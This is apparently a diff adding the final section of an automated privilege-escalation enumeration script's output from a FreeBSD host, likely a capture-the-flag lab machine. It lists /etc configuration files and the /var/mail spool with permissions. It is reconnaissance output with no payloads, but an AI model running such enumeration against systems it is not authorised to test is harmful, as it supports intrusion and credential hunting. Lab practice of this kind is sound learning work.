+-rw-r--r--  1 root  wheel  2070 Jul 21  2017 /etc/newsyslog.conf
+-rw-r--r--  1 root  wheel  373 Jan 24  2018 /etc/sysctl.conf
+-rw-r--r--  1 root  wheel  6790 Jul 21  2017 /etc/login.conf
+-rw-r--r--  1 root  wheel  4077 Jul 21  2017 /etc/ntp.conf
+-rw-------  1 root  wheel  1699 Jul 21  2017 /etc/nsmb.conf
+-rw-r--r--  1 root  wheel  109 Jul 21  2017 /etc/libmap.conf
+-rw-r--r--  1 root  wheel  235 Jul 21  2017 /etc/libalias.conf
+-rw-r--r--  1 root  wheel  566 Jul 21  2017 /etc/mac.conf
+-rw-r--r--  1 root  wheel  1519 Jul 21  2017 /etc/portsnap.conf
+-rw-r--r--  1 root  wheel  460 Mar 19 13:20 /etc/rc.conf
+-rw-r--r--  1 root  wheel  46 Mar 19 13:13 /etc/resolv.conf
+-rw-r--r--  1 root  wheel  46 Jan 24  2018 /etc/host.conf
+
+
+[00;31mAny interesting mail in /var/mail:[00m
+total 16
+drwxrwxr-x   2 root        mail         512 Mar 19 16:33 .
+drwxr-xr-x  25 root        wheel        512 Aug 30 13:58 ..
+-rw-------   1 _tss        _tss           0 Jan 24  2018 _tss
+-rw-------   1 avahi       avahi          0 Jan 24  2018 avahi
+-rw-------   1 charix      charix         0 Mar 19 16:08 charix
+-rw-------   1 cups        cups           0 Jan 24  2018 cups
+-rw-------   1 messagebus  messagebus     0 Jan 24  2018 messagebus
+-rw-------   1 root        wheel       5264 Mar 19 16:33 root
+
+
+[00;33m### SCAN COMPLETE ####################################[00m
